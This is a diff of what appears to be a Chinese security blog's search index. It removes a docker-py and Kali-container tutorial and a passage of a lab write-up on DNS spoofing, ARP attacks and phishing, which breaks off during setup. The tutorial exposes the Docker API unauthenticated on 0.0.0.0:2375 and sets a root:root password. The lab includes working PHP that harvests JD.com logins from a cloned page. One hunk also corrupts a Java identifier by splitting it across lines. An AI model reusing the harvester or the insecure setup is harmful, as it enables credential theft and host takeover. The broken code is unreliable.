@@ -304,7 +304,8 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
     &#125;
 
     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = k; i &lt; nums.length; i++) &#123;
-        Integer peek = priorityQueue.peek();
+        Integer peek = priori
+            tyQueue.peek();
         <span class="hljs-keyword">if</span>(nums[i] &gt; peek)&#123;
             priorityQueue.poll();
             priorityQueue.offer(nums[i]);
@@ -1217,393 +1218,6 @@ print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>dockerpy</title>
-    <url>/2022/05/15/dockerpy/</url>
-    <content><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>使用python第三方库docker-py操作docker</p>
-<p>docker-py的地址：<a href="https://github.com/docker/docker-py">https://github.com/docker/docker-py</a></p>
-<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><h3 id="1-安装docker-py"><a href="#1-安装docker-py" class="headerlink" title="1.安装docker-py"></a>1.安装docker-py</h3><p>​    pip安装即可，安装最新版</p>
-<pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> docker</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135319833.png" alt="image-20220515135319833"></p>
-<h3 id="2-配置docker"><a href="#2-配置docker" class="headerlink" title="2.配置docker"></a>2.配置docker</h3><p>本文使用的是Docker Desktop，docker版本是<code>20.10.12</code></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135534992.png" alt="image-20220515135534992"></p>
-<h4 id="docker开启远程访问"><a href="#docker开启远程访问" class="headerlink" title="docker开启远程访问"></a>docker开启远程访问</h4><p>对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140305267.png" alt="image-20220515140305267"> </p>
-<p>对于linux中配置远程访问就稍微麻烦一点</p>
-<p><strong>方法一</strong></p>
-<p>在/usr/lib/systemd/system/docker.service，配置远程访问。</p>
-<p>主要是在[Service]这个部分，加上下面两个参数</p>
-<pre><code class="hljs ini"><span class="hljs-comment"># vim /usr/lib/systemd/system/docker.service</span>
-<span class="hljs-section">[Service]</span>
-ExecStart=
-<span class="hljs-attr">ExecStart</span>=/usr/bin/dockerd -H tcp://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix://var/run/docker.sock</code></pre>
-
-<p>重启</p>
-<pre><code class="hljs undefined">systemctl daemon-reload
-systemctl restart docker</code></pre>
-
-<p><strong>方法二</strong></p>
-<p>修改<code>daemon.json</code>的配置</p>
-<pre><code class="hljs bash">vim /etc/docker/daemon.json
-
-&#123;
-  <span class="hljs-string">&quot;hosts&quot;</span>: [<span class="hljs-string">&quot;tcp://0.0.0.0:2375&quot;</span>, <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span>]
-&#125;</code></pre>
-
-<blockquote>
-<p>“unix:///var/run/docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。<br>“tcp://0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。</p>
-</blockquote>
-<p>修改配置以后</p>
-<p>然后让docker重新读取配置文件,并重启docker服务</p>
-<pre><code class="hljs undefined">systemctl daemon-reload
-systemctl restart docker</code></pre>
-
-<p>查看docker进程：</p>
-<pre><code class="hljs perl">[root@slaver2 ~]<span class="hljs-comment"># ps -ef|grep docker</span>
-root      <span class="hljs-number">44221</span>      <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> /usr/bin/dockerd -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span>var/run/docker.sock</code></pre>
-
-<p>Docker守护进程打开一个HTTP Socket,这样才能实现远程通信</p>
-<p>当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准</p>
-<ul>
-<li><p>查看当前版本：<a href="http://IP:2375/version">http://IP:2375/version</a></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141120592.png" alt="image-20220515141120592"></p>
-</li>
-<li><p>查看所有镜像信息：<a href="http://IP:2375/images/json">http://IP:2375/images/json</a></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140906433.png" alt="image-20220515140906433"></p>
-</li>
-<li><p>查看已启动容器信息：<a href="http://127.0.0.1:2375/containers/json">http://127.0.0.1:2375/containers/json</a></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141343749.png" alt="image-20220515141343749"></p>
-</li>
-<li><p>查看网卡信息： <a href="http://127.0.0.1:2375/networks/">http://127.0.0.1:2375/networks/</a></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141509777.png" alt="image-20220515141509777"></p>
-</li>
-</ul>
-<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="Docker-Desktop与VM冲突"><a href="#Docker-Desktop与VM冲突" class="headerlink" title="Docker Desktop与VM冲突"></a>Docker Desktop与VM冲突</h5><p>需要注意的是，安装Docker Desktop 后VM就无法使用，原因：</p>
-<blockquote>
-<p>1、Device Guard或Credential Guard与Workstation不兼容。</p>
-<p>2、Windows系统的Hyper-V不兼容导致</p>
-</blockquote>
-<p>解决方法如<a href="https://blog.csdn.net/qq_36761831/article/details/81175736">https://blog.csdn.net/qq_36761831/article/details/81175736</a></p>
-<p>开启和关闭Hyper-V</p>
-<pre><code class="hljs shell">bcdedit /set hypervisorlaunchtype auto
-bcdedit /set hypervisorlaunchtype off</code></pre>
-
-<p>当需要使用VM时，执行关闭Hyper-V命令即可</p>
-<h5 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h5><p>settings=&gt;Dokcer engine修改配置内容</p>
-<pre><code class="hljs json">&#123;
-  <span class="hljs-attr">&quot;builder&quot;</span>: &#123;
-    <span class="hljs-attr">&quot;gc&quot;</span>: &#123;
-      <span class="hljs-attr">&quot;defaultKeepStorage&quot;</span>: <span class="hljs-string">&quot;20GB&quot;</span>,
-      <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>
-    &#125;
-  &#125;,
-  <span class="hljs-attr">&quot;experimental&quot;</span>: <span class="hljs-literal">false</span>,
-  <span class="hljs-attr">&quot;features&quot;</span>: &#123;
-    <span class="hljs-attr">&quot;buildkit&quot;</span>: <span class="hljs-literal">true</span>
-  &#125;,
-  <span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [
-    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span>,
-    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>,
-    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>
-  ]
-&#125;</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141737016.png" alt="image-20220515141737016"></p>
-<h5 id="docker配置软链接"><a href="#docker配置软链接" class="headerlink" title="docker配置软链接"></a>docker配置软链接</h5><p>由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。<a href="https://zhuanlan.zhihu.com/p/343278599">参考</a></p>
-<p>请务必先关闭docker 或者docker desktop</p>
-<ul>
-<li>通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径：</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/v2-affd20a39ee0002a4c880ff3eb4e75f7_720w.jpg" alt="img"></p>
-<ul>
-<li>将.vhdx复制到想要的路径下，本文路径为：</li>
-</ul>
-<p><img src="https://pic1.zhimg.com/80/v2-70f80706f26839ff0dd3a4fcdc0aca80_720w.jpg" alt="img"></p>
-<ul>
-<li><p>删除源文件夹，本文是data文件夹</p>
-</li>
-<li><p>以管理员运行cmd并且使用以下命令创建链接：</p>
-<pre><code class="hljs shell">mklink /J C:\Users\admin\AppData\Local\Docker\wsl\data   D:\docker\data</code></pre>
-
-<p>请大家自行替换路径，本文路径分别为源路径：C:\Users\admin\AppData\Local\Docker\wsl\data</p>
-<p>以及想要移动的路径：D:\docker\data此时可以在源路径看到新建出来的文件夹</p>
-</li>
-</ul>
-<h2 id="使用dockerpy"><a href="#使用dockerpy" class="headerlink" title="使用dockerpy"></a>使用dockerpy</h2><p>官方给出了详细的说明文档<a href="https://docker-py.readthedocs.io/en/stable/index.html">说明文档</a>，下面只给出几个常见的操作</p>
-<h3 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h3><p>进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515144118231.png" alt="image-20220515144118231"></p>
-<h4 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h4><p>查看源码，可知有三个可选参数</p>
-<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">False</span>, filters=<span class="hljs-literal">None</span></span>):</span>
-    <span class="hljs-string">&quot;&quot;&quot;</span>
-<span class="hljs-string">    List images on the server.</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">    Args:</span>
-<span class="hljs-string">        name (str): Only show images belonging to the repository ``name``</span>
-<span class="hljs-string">        all (bool): Show intermediate image layers. By default, these are</span>
-<span class="hljs-string">            filtered out.</span>
-<span class="hljs-string">        filters (dict): Filters to be processed on the image list.</span>
-<span class="hljs-string">            Available filters:</span>
-<span class="hljs-string">            - ``dangling`` (bool)</span>
-<span class="hljs-string">            - ``label`` (str): format either ``key`` or ``key=value``</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">    Returns:</span>
-<span class="hljs-string">        (list of :py:class:`Image`): The images.</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">    Raises:</span>
-<span class="hljs-string">        :py:class:`docker.errors.APIError`</span>
-<span class="hljs-string">            If the server returns an error.</span>
-<span class="hljs-string">    &quot;&quot;&quot;</span>
-    resp = self.client.api.images(name=name, <span class="hljs-built_in">all</span>=<span class="hljs-built_in">all</span>, filters=filters)
-    <span class="hljs-keyword">return</span> [self.get(r[<span class="hljs-string">&quot;Id&quot;</span>]) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resp]</code></pre>
-
-<h5 id="获取所有镜像"><a href="#获取所有镜像" class="headerlink" title="获取所有镜像"></a>获取所有镜像</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
-
-client = docker.from_env()
-imagesList = client.images.<span class="hljs-built_in">list</span>()
-print(imagesList)</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515143446882.png" alt="image-20220515143446882"></p>
-<h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>该函数只有一个参数name，镜像名称</p>
-<p>获取指定名称的镜像</p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
-client = docker.from_env()
-mysqlImage = client.images.get(<span class="hljs-string">&quot;mysql&quot;</span>)
-print(mysqlImage)</code></pre>
-
-<h4 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h4><p>与docker search 命令相同</p>
-<pre><code class="hljs stylus">searchList = client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.search</span>(<span class="hljs-string">&quot;nginx&quot;</span>)
-<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(searchList)</span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515153818793.png" alt="image-20220515153818793"></p>
-<h4 id="pull"><a href="#pull" class="headerlink" title="pull()"></a>pull()</h4><p>作用等同于docker pull</p>
-<pre><code class="hljs stylus">client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.pull</span>(<span class="hljs-string">&quot;nginx&quot;</span>)</code></pre>
-
-<h3 id="container相关操作"><a href="#container相关操作" class="headerlink" title="container相关操作"></a>container相关操作</h3><p>容器相关的操作很多</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515161345640.png" alt="image-20220515161345640"></p>
-<h4 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h4><p>官方注释</p>
-<pre><code class="hljs lasso">Run a container. <span class="hljs-keyword">By</span> default, it will wait for the container <span class="hljs-keyword">to</span> finish
-<span class="hljs-literal">and</span> <span class="hljs-keyword">return</span> its logs, similar <span class="hljs-keyword">to</span> <span class="hljs-string">``</span>docker run<span class="hljs-string">``</span>.
-<span class="hljs-comment">// </span>
-<span class="hljs-keyword">If</span> the <span class="hljs-string">``</span>detach<span class="hljs-string">``</span> argument is <span class="hljs-string">``</span><span class="hljs-literal">True</span><span class="hljs-string">``</span>, it will start the container
-<span class="hljs-literal">and</span> immediately <span class="hljs-keyword">return</span> a :py:class:<span class="hljs-string">`Container`</span> object, similar <span class="hljs-keyword">to</span>
-<span class="hljs-string">``</span>docker run <span class="hljs-params">-d</span><span class="hljs-string">``</span>.</code></pre>
-
-
-
-<pre><code class="hljs python">port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
-image_name = nginx
-client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 以守护进程的方式创建容器，容器停止后不会删除</span>
-
-```
-- The port number, <span class="hljs-keyword">as</span> an integer. For example,
-``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;`` will expose port <span class="hljs-number">2222</span> inside the
-container <span class="hljs-keyword">as</span> port <span class="hljs-number">3333</span> on the host.
-- ``<span class="hljs-literal">None</span>``, to assign a random host port. For example,
-``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-literal">None</span>&#125;``.
-- A <span class="hljs-built_in">tuple</span> of ``(address, port)`` <span class="hljs-keyword">if</span> you want to specify the
-host interface. For example,
-``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1111</span>)&#125;``.
-- A <span class="hljs-built_in">list</span> of integers, <span class="hljs-keyword">if</span> you want to bind multiple host ports
-to a single container port. For example,
-``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: [<span class="hljs-number">1234</span>, <span class="hljs-number">4567</span>]&#125;``.
-```</code></pre>
-
-<h4 id="get-1"><a href="#get-1" class="headerlink" title="get()"></a>get()</h4><p>获取容器对象</p>
-<pre><code class="hljs python">docker_container_id = <span class="hljs-string">&quot;236efe761aeb&quot;</span>
-container = client.containers.get(docker_container_id)
-print(container.<span class="hljs-built_in">id</span>)
-print(container.attrs) <span class="hljs-comment"># 获取容器的详细信息</span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515163148958.png" alt="image-20220515163148958"></p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>进入容器内部执行命令，与下面的命令作用相同</p>
-<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> containerID bash</code></pre>
-
-<pre><code class="hljs python">command = <span class="hljs-string">&#x27;touch /tmp/flag&#x27;</span> 
-port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
-image_name = nginx
-container = client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  
-container.exec_run(command)</code></pre>
-
-
-
-<h3 id="network相关操作"><a href="#network相关操作" class="headerlink" title="network相关操作"></a>network相关操作</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>使用默认参数，桥接模式创建网卡</p>
-<pre><code class="hljs python">client.networks.create(<span class="hljs-string">&quot;net1&quot;</span>, driver=<span class="hljs-string">&quot;bridge&quot;</span>)</code></pre>
-
-<p>使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0/24和网关地址为192.168.52.254</p>
-<pre><code class="hljs routeros">ipam_pool = docker.types.IPAMPool(
-    <span class="hljs-attribute">subnet</span>=<span class="hljs-string">&#x27;192.168.52.0/24&#x27;</span>,
-    <span class="hljs-attribute">gateway</span>=<span class="hljs-string">&#x27;192.168.52.254&#x27;</span>
-)
-ipam_config = docker.types.IPAMConfig(
-    pool_configs=[ipam_pool]
-)
-
-client.networks.create(
-    <span class="hljs-string">&quot;network1&quot;</span>,
-    <span class="hljs-attribute">driver</span>=<span class="hljs-string">&quot;bridge&quot;</span>,
-    <span class="hljs-attribute">ipam</span>=ipam_config
-)</code></pre>
-
-
-
-<h1 id="创建kali攻击机镜像"><a href="#创建kali攻击机镜像" class="headerlink" title="创建kali攻击机镜像"></a>创建kali攻击机镜像</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull kalilinux/kali-rolling</code></pre>
-
-<p>查看下载的镜像</p>
-<pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span></code></pre>
-
-<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kalilinux/kali-rolling /bin/bash</code></pre>
-
-<p>查看容器id</p>
-<pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span></code></pre>
-
-<p>进入容器</p>
-<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>
-
-<h2 id="安装基础环境包"><a href="#安装基础环境包" class="headerlink" title="安装基础环境包"></a>安装基础环境包</h2><p>❗需要关闭防火墙或者打开3399端口，否则无法连接</p>
-<p>首先安装vim</p>
-<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y upgrade
-apt-<span class="hljs-builtin-name">get</span> update --fix-missing	
-apt-<span class="hljs-builtin-name">get</span> install vim</code></pre>
-
-<p>修改镜像源</p>
-<pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>apt/sources.list
-
-添加内容
-deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-deb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre>
-
-<p>安装基础环境包</p>
-<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y<span class="hljs-built_in"> upgrade </span>&amp;&amp; \
-   <span class="hljs-attribute">DEBIAN_FRONTEND</span>=noninteractive apt-<span class="hljs-builtin-name">get</span> install -y \
-   kali-tools-top10 \
-   pciutils \
-   iputils-ping \
-   bash-completion &amp;&amp; \
-   apt-<span class="hljs-builtin-name">get</span> autoremove -y &amp;&amp; \
-   apt-<span class="hljs-builtin-name">get</span> clean</code></pre>
-
-<h2 id="生成新镜像"><a href="#生成新镜像" class="headerlink" title="生成新镜像"></a>生成新镜像</h2><p>待上面的所有程序安装完成后，打包生成新镜像</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit f<span class="hljs-number">16618</span>e<span class="hljs-number">0</span>fda<span class="hljs-number">5</span> kali-<span class="hljs-number">2021</span></code></pre>
-
-
-
-<h2 id="远程桌面环境安装"><a href="#远程桌面环境安装" class="headerlink" title="远程桌面环境安装"></a>远程桌面环境安装</h2><h3 id="使用新镜像启动容器"><a href="#使用新镜像启动容器" class="headerlink" title="使用新镜像启动容器"></a>使用新镜像启动容器</h3><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-<span class="hljs-number">2021</span></code></pre>
-
-<p>进入镜像</p>
-<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>
-
-<h3 id="安装桌面服务"><a href="#安装桌面服务" class="headerlink" title="安装桌面服务"></a>安装桌面服务</h3><p><strong>●</strong> kali-desktop-xfce ：安装远程桌面环境</p>
-<p><strong>●</strong> xrdp ：远程桌面服务</p>
-<p><strong>●</strong> xorg：xorg是x11的一个实现，xorg提供X server</p>
-<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> update
-
-apt-<span class="hljs-builtin-name">get</span> -y install kali-desktop-xfce xorg xrdp</code></pre>
-
-<p>配置xrdp实现远程连接图形界面：</p>
-<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
-service xrdp restart</code></pre>
-
-<p>修改root用户密码：</p>
-<pre><code class="hljs vim">passwd root
-
-
-<span class="hljs-keyword">echo</span> roo<span class="hljs-variable">t:root</span>|chpasswd</code></pre>
-
-<p>再次登录XRDP：</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220304155750507.png" alt="image-20220304155750507"></p>
-<h3 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h3><pre><code class="hljs applescript">docker commit <span class="hljs-built_in">id</span> docker-attack</code></pre>
-
-<h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>因为启动容器后需要运行</p>
-<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
-service xrdp restart</code></pre>
-
-<p>所有使用Dockerfile完成这两步操作</p>
-<pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> kali-attack:latest
-<span class="hljs-keyword">COPY</span><span class="bash"> run.sh /home/run.sh</span>
-<span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span>
-<span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;</span>]</span></code></pre>
-
-<p> 没有<code>tail -f /dev/null</code>会导致启动容器后自动退出无法使用，<a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">原因</a>可能如下</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220305103247695.png" alt="image-20220305103247695"></p>
-<p><code>run.sh</code>中的内容，为启动容器后需要执行的两条命令</p>
-<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>
-
-sed -i <span class="hljs-string">&#x27;s/port=3399/port=3389/g&#x27;</span> /etc/xrdp/xrdp.ini
-<span class="hljs-built_in">wait</span>
-service xrdp restart</code></pre>
-
-<p>使用</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t kali-attack<span class="hljs-number">2</span> .</code></pre>
-
-<p>创建镜像，之后创建容器</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-attack<span class="hljs-number">2</span></code></pre>
-
-<p>这样就可以直接使用mstvc.exe连接kali桌面</p>
-<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>root
-<span class="hljs-symbol">password:</span>root</code></pre>
-
-
-
-<h1 id="docker访问宿主机网络资源"><a href="#docker访问宿主机网络资源" class="headerlink" title="docker访问宿主机网络资源"></a>docker访问宿主机网络资源</h1><p><a href="https://swiftflamel.com/2021/04/01/docker-container%E5%AE%B9%E5%99%A8%E5%86%85%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BAhost%E6%9C%8D%E5%8A%A1/">解决方案</a></p>
-<p>本文使用的的windows docker版本大于18.03可以直接使用<code>host.docker.internal</code>访问宿主机网络资源</p>
-<p>其他操作系统的可以<a href="https://www.jianshu.com/p/4a358a120983">参考</a></p>
-<h1 id="docker容器安装vim出错"><a href="#docker容器安装vim出错" class="headerlink" title="docker容器安装vim出错"></a>docker容器安装vim出错</h1><p>报错信息如下</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">ncurses</span>-base : Breaks: libtinfo<span class="hljs-number">5</span> (&lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>) but <span class="hljs-number">6</span>.<span class="hljs-number">0</span>+<span class="hljs-number">20161126</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">9</span>u<span class="hljs-number">2</span> is to be installed
-<span class="hljs-attribute">E</span>: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages.
-<span class="hljs-attribute">E</span>: Unable to correct dependencies</code></pre>
-
-<p>直接使用apt安装此包即可</p>
-<pre><code class="hljs vim">apt <span class="hljs-keyword">update</span>
-apt upgrade
-apt install <span class="hljs-keyword">vim</span></code></pre>
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>diaoyu</title>
-    <url>/2020/07/18/diaoyu/</url>
-    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
-<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
-<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
-<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
-<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
-@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
-<span class="hljs-meta">?&gt;</span>
-&lt;html&gt;
-&lt;head&gt;
-&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
-		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">		</span>&#123;
-			window.history.back() <span class="hljs-comment">//后退+刷新</span>
-		&#125;
-&lt;/script&gt;
-&lt;/head&gt;
-&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
-<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
